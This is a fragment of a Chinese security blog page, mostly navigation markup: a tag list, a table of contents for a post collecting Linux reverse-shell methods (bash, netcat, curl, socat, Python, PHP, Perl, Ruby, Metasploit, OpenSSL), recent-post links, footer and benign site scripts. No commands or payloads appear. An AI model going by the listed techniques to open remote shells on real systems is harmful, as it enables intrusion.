+    
+      <a 
+        href="/tags/%E6%8F%90%E6%9D%83/" 
+        title="提权">
+        <div class="tags-list-item">提权</div>
+      </a>
+    
+      <a 
+        href="/tags/LAMP/" 
+        title="LAMP">
+        <div class="tags-list-item">LAMP</div>
+      </a>
+    
+      <a 
+        href="/tags/DVWA/" 
+        title="DVWA">
+        <div class="tags-list-item">DVWA</div>
+      </a>
+    
+      <a 
+        href="/tags/IIS/" 
+        title="IIS">
+        <div class="tags-list-item">IIS</div>
+      </a>
+    
+      <a 
+        href="/tags/Java%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" 
+        title="Java环境配置">
+        <div class="tags-list-item">Java环境配置</div>
+      </a>
+    
+      <a 
+        href="/tags/Vulhub/" 
+        title="Vulhub">
+        <div class="tags-list-item">Vulhub</div>
+      </a>
+    
+      <a 
+        href="/tags/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97/" 
+        title="Shiro反序列">
+        <div class="tags-list-item">Shiro反序列</div>
+      </a>
+    
+      <a 
+        href="/tags/Python3/" 
+        title="Python3">
+        <div class="tags-list-item">Python3</div>
+      </a>
+    
+      <a 
+        href="/tags/SQL%E6%B3%A8%E5%85%A5/" 
+        title="SQL注入">
+        <div class="tags-list-item">SQL注入</div>
+      </a>
+    
+      <a 
+        href="/tags/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" 
+        title="Redis未授权访问">
+        <div class="tags-list-item">Redis未授权访问</div>
+      </a>
+    
+      <a 
+        href="/tags/requests%E6%A8%A1%E5%9D%97/" 
+        title="requests模块">
+        <div class="tags-list-item">requests模块</div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+            <aside class="right-column">
+              <div class="sticky-widescreen">
+  
+  
+    <article class="card card-content toc-card">
+      <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E5%8F%8D%E5%BC%B9shell%E5%BD%92%E7%BA%B3"><span class="toc-text">Linux反弹shell归纳</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Bash反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9shell%E6%97%B6%EF%BC%8C%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-text">注意：利用工具写入反弹shell时，命令如下：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#netcat%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">netcat反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Curl-Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Curl+Bash反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Socat%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Socat反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Telnet%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Telnet反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Python脚本反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">PHP脚本反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Perl%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%90%8E%E7%BC%80-pl%EF%BC%89"><span class="toc-text">Perl脚本反弹shell（后缀.pl）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruby%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%90%8E%E7%BC%80-rb%EF%BC%89"><span class="toc-text">Ruby脚本反弹shell（后缀.rb）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Metasploit生成反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OpenSSL%E5%8F%8D%E5%BC%B9%E5%8A%A0%E5%AF%86shell"><span class="toc-text">OpenSSL反弹加密shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%90%8E%E8%8E%B7%E5%8F%96%E6%A8%A1%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="toc-text">反弹shell后获取模拟终端</span></a></li></ol></li></ol>
+    </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header">
+    <i 
+      class="iconfont icon-wenzhang_huaban" 
+      style="padding-right: 2px;">
+    </i>最近文章
+  </div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-07-19</div>
+        <a href="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/"><div class="recent-posts-item-content">Pocsuite3重写redis脚本</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-07-19</div>
+        <a href="/article/Pocsuite3%E4%BD%BF%E7%94%A8/"><div class="recent-posts-item-content">Pocsuite3使用</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-07-09</div>
+        <a href="/article/SQL%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"><div class="recent-posts-item-content">SQL注入方法总结</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-07-09</div>
+        <a href="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/"><div class="recent-posts-item-content">Burpsuite挂梯子抓包</div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+          </div>
+        </div>
+      </div>
+    </div>
+     
+    <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>
+          Copyright ©
+          
+            2020 -
+          
+          2021
+        </span>
+        &nbsp;
+        <a 
+          href="/" 
+          class="footer-link">
+          沉墨的小小技术圈
+        </a>
+      </div>
+    </div>
+
+    
+    
+    
+    
+      <div class="footer-dsc">
+        
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+        
+          <span>&nbsp;|&nbsp;</span>
+        
+        
+          本站总访客数<span id="busuanzi_value_site_uv"></span>次
+        
+      </div>
+      
+    
+</footer> 
+    
+  <a 
+    role="button" 
+    id="scrollbutton" 
+    class="basebutton" 
+    aria-label="回到顶部">
+    <i class="iconfont icon-arrowleft button-icon"></i>
+  </a>
+
+<a 
+  role="button" 
+  id="menubutton" 
+  class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="popbutton" 
+  class="basebutton" 
+  aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="darkbutton" 
+  class="basebutton darkwidget" 
+  aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="searchbutton" 
+  class="basebutton searchwidget" 
+  aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a> 
+     
+     
+     
+      <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img')
+    var i
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a')
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
+      wrapper.setAttribute('aria-label', 'illustration')
+      wrapper.style.cssText =
+        'width: 100%; display: flex; justify-content: center;'
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt
+      wrapper.dataset.nolink = true
+      img[i].before(wrapper)
+      wrapper.append(img[i])
+      var divWrap = document.createElement('div')
+      divWrap.classList.add('gallery')
+      wrapper.before(divWrap)
+      divWrap.append(wrapper)
+    }
+    baguetteBox.run('.gallery')
+  }
+</script>
+<script>
+  loadScript(
+    "/js/lib/lightbox/baguetteBox.min.js",
+    addImgLayout
+  )
+</script>
+ 
+     
+     
+    <script src="/js/main.js"></script> 
+    
+      <script> 
+        loadScript('/js/lib/busuanzi.min.js') 
+      </script>
+     
+    
+      <script>
+        var addLazyload = function () {
+          var observer = lozad('.lozad', {
+            load: function (el) {
+              el.srcset = el.getAttribute('data-src')
+            },
+            loaded: function (el) {
+              el.classList.add('loaded')
+            },
+          })
+          observer.observe()
+        }
+      </script>
+      <script>
+        loadScript('/js/lib/lozad.min.js', addLazyload)
+      </script>
+     
+    
+    
+      <script>
+        setTimeout(() => {localSearch("search.json")}, 0)
+      </script>
+    
+  </body>
+</html>
